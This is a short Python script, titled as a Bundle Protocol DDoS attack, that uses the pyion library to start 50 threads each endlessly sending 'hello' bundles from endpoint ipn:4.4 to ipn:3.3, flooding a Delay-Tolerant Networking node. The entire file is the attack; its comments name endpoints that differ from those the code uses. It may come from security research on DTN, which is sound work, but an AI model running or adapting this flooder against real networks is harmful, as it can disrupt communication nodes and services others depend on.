# Basic Bundle Protocol DDoS Ataack

# Import modules
import pyion
import threading

# Source and destination address
source_ipn = 'ipn:4.4'
target_ipn = 'ipn:3.3'

def attack():
    while True:
        try:
            # Create a proxy to node 1 and attach to ION
            proxy = pyion.get_bp_proxy(1)
            proxy.bp_attach()

            # Open endpoint 'ipn:1.1' and send data to 'ipn:2.1'
            with proxy.bp_open(source_ipn) as eid:
                eid.bp_send(target_ipn, b'hello')
        except InterruptedError:
            # User has triggered interruption with Ctrl+C
            break

for i in range(50):
    thread = threading.Thread(target=attack)
    thread.start()